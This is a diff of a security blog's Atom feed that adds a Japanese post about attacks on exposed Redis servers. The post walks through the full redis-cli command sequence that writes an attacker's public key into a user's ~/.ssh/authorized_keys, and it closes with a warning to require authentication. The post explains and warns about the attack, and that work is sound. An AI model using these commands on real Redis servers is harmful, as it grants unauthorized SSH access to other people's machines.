@@ -4,7 +4,7 @@
   <subtitle><![CDATA[tail -f csirt.log]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="https://csirt.mrtc0.com/"/>
-  <updated>2016-03-06T07:27:54.318Z</updated>
+  <updated>2016-03-07T19:02:18.436Z</updated>
   <id>https://csirt.mrtc0.com/</id>
   
   <author>
@@ -15,9 +15,48 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[Redisで任意のファイルをアップロードする攻撃]]></title>
+    <link href="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/</id>
+    <published>2016-03-07T11:41:31.000Z</published>
+    <updated>2016-03-07T19:02:18.436Z</updated>
+    <content type="html"><![CDATA[<p>年末年始からRedisを狙った攻撃が増加しているようです.  </p>
+<ul>
+<li><a href="http://www.security-next.com/065845" target="_blank" rel="external">「Redis」狙う不正アクセスが年末年始に急増 Security NEXT</a>  </li>
+<li><a href="https://www.npa.go.jp/cyberpolice/topics/?seq=17577" target="_blank" rel="external">NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police</a></li>
+<li><a href="http://scan.netsecurity.ne.jp/article/2016/01/14/37930.html" target="_blank" rel="external">「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）</a></li>
+</ul>
+<p>要約すると外部から任意のファイルをアップロードができるため, authorized_keysなどに攻撃者の公開鍵が作成されてしまいます.  </p>
+<p>攻撃の例を以下に示します.<br>redis-serverがuserというユーザーの権限で動いているとします.<br>まず, userのauthorized_keysには何も含まれていません.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys</span><br></pre></td></tr></table></figure></p>
+<p>まず, 攻撃者は既に格納されているキーとバリューをクリアします.<br>その後, 自身の公開鍵を適当なキー(ここではpwnというキー)で保存します.<br>そしてデータを書き出すディレクトリ(/home/user/.ssh/)を設定し, ファイル名をauthorized_keysとします.<br>最後にデータを書き出します. [1]</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> flushall</span><br><span class="line">$ cat id_rsa.pub| redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> -x <span class="built_in">set</span> pwn</span><br><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dir <span class="string">"/home/user/.ssh"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"/home/user/.ssh"</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>これでuserのauthorized_keysには攻撃者の公開鍵が追加され, SSHでのログインを許してしまうことになります.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys </span><br><span class="line">ssh-rsa <span class="constant">AAAAB3NzaC1yc2EAAAADAQABAAABAQDIUgAzqX0.</span>.. mrtc<span class="number">0</span><span class="variable">@localhost</span></span><br></pre></td></tr></table></figure></p>
+<p>もちろん, redis-serverを動かしているユーザーが書き込める権限がなければいけませんが.  </p>
+<p>インターネットに公開した状態で認証をかけず, 適切な権限で動かしていないと大変なことになりますので注意が必要です.  </p>
+<h5 id="u53C2_u8003_u6587_u732E"><a href="#u53C2_u8003_u6587_u732E" class="headerlink" title="参考文献"></a>参考文献</h5><ul>
+<li><a href="https://cocopoo.com/2015/11/crackredis-io-2/" target="_blank" rel="external">crack@redis.io #2</a></li>
+<li><a href="https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/" target="_blank" rel="external">A few things about Redis security</a></li>
+</ul>
+<p>[1]: 実際はゴミデータも含まれるため (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) のようにして改行を挟む必要がある.</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>年末年始からRedisを狙った攻撃が増加しているようです.  </p>
+<ul>
+<li><a href="http://www.security-next.com/065845" target="_blank" rel="external">「Redis」狙う不正アクセス]]>
+    </summary>
+    
+      <category term="honeypot" scheme="https://csirt.mrtc0.com/tags/honeypot/"/>
+    
+      <category term="nosqlpot" scheme="https://csirt.mrtc0.com/tags/nosqlpot/"/>
+    
+      <category term="redis" scheme="https://csirt.mrtc0.com/tags/redis/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)]]></title>
-    <link href="https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/"/>
-    <id>https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/</id>
+    <link href="https://csirt.mrtc0.com/uncategorized/cilickxg90005i2cmfnatlivy/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cilickxg90005i2cmfnatlivy/</id>
     <published>2016-03-05T14:00:49.000Z</published>
     <updated>2016-03-06T07:27:54.318Z</updated>
     <content type="html"><![CDATA[<p>2015年の1年間のハニーポットの記録です.<br>また, セキュリティ・キャンプ フォーラム2016で行われたセキュリティ・キャンプ アワード2016の発表内容です.  </p>
@@ -155,8 +194,8 @@
   
   <entry>
     <title><![CDATA[.htaccessで悪質なサイトへ誘導する手法]]></title>
-    <link href="https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/"/>
-    <id>https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/</id>
+    <link href="https://csirt.mrtc0.com/uncategorized/cilickxfo0000i2cm6oyj21rd/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cilickxfo0000i2cm6oyj21rd/</id>
     <published>2016-01-21T14:45:06.000Z</published>
     <updated>2016-01-21T16:48:38.400Z</updated>
     <content type="html"><![CDATA[<p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
